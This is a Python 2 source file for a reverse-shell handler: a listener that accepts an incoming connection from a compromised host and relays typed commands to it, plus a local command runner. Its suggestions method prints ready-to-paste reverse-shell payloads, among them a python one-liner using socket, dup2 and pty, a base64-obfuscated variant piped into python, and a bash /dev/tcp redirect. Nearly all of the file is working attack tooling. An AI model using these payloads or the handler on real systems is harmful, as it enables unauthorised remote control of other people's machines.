from subprocess import Popen, PIPE
import getpass
import socket
import base64
import time

BUFF_SIZE = 4096


class Connector():

    def __init__(self):
        return None

    def ask_cmd(self):
        cmd = raw_input("> ")
        print cmd

    def exec_cmd(self, cmd):
        print cmd

    def name(self):
        return None


class Local(Connector):

    def __init__(self):
        self.hostaddr = "127.0.0.1"
        self.hostname = getpass.getuser()

    def ask_cmd(self):
        cmd = raw_input("%s@%s> " % (self.hostaddr, self.hostname))
        return self.exec_cmd(cmd)

    def exec_cmd(self, cmd):
        p = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
        stdout, stderr = p.communicate()
        return stdout + stderr

    def name(self):
        return self.hostaddr


class ReverseShell(Connector):

    def __init__(self, port):
        self.hostname = ""
        self.hostaddr = ""
        self.port = port
        self.s = None
        self.conn = None
        self.suggestions()
        self.listen()

    def suggestions(self):
        host = ""
        pycode = "import sys,os,socket,pty;"
        pycode += "s=socket.socket();"
        pycode += "s.connect((\"%s\",%d));" % (host, self.port)
        pycode += "os.dup2(s.fileno(),0);"
        pycode += "os.dup2(s.fileno(),1);"
        pycode += "os.dup2(s.fileno(),2);"
        pycode += "pty.spawn(\"/bin/sh\");"
        pycode += "s.close()"
        print "*** PYTHON ***\npython -c '%s'" % (pycode)
        print "*** PYTHON ***\necho %s | base64 -d | python" % base64.b64encode(pycode)
        print "*** BASH ***\nbash -i >& /dev/tcp/%s/%d 0>&1"% (host, self.port)

    def listen(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(1)
        except socket.error, msg:
            print "[!] Socket error: " + str(msg[0]) + ", Message " + msg[1]
            return
        print '[*] Binding socket at port %d' % (self.port)
        try:
            s.bind(("0.0.0.0", self.port))
            s.listen(1)
        except socket.error, msg:
            print "[!] Socket error: " + str(msg[0]) + ", Message " + msg[1]
            s.close()
            return
        conn, addr = s.accept()
        print '[!] Session opened at %s:%s' % (addr[0], addr[1])
        self.status = True
        self.hostaddr = str(addr[0])
        self.hostname = str(conn.recv(BUFF_SIZE))
        self.s = s
        self.conn = conn

    def ask_cmd(self):
        cmd = raw_input("%s@%s> " % (self.hostaddr, self.hostname))
        return self.exec_cmd(cmd)

    def exec_cmd(self, cmd):
        cmd += '\n'
        self.conn.send(cmd)
        time.sleep(.1)
        data = ''
        
        while True:
            part = self.conn.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                break
        if data and len(data.split('\n')) > 1:
            self.hostname = data[data.rfind('\n')+1:]
            stdout = data[data.find('\n')+1:data.rfind('\n')]
            return stdout
        return None

    def exit(self):
        self.conn.close()
        self.s.close()

    def name(self):
        return self.hostaddr
